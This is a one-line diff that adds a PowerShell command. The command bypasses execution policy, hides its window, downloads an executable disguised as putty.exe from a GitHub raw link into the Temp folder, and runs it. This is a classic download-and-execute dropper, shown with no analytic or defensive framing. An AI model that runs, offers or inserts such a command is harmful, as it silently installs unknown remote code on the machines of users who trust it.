@@ -1,0 +1,1 @@
+powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/snozloy54/alik333/blob/main/putty.exe?raw=true',"$env:Temp\Example.exe");Start-Process ("$env:Temp\Example.exe")
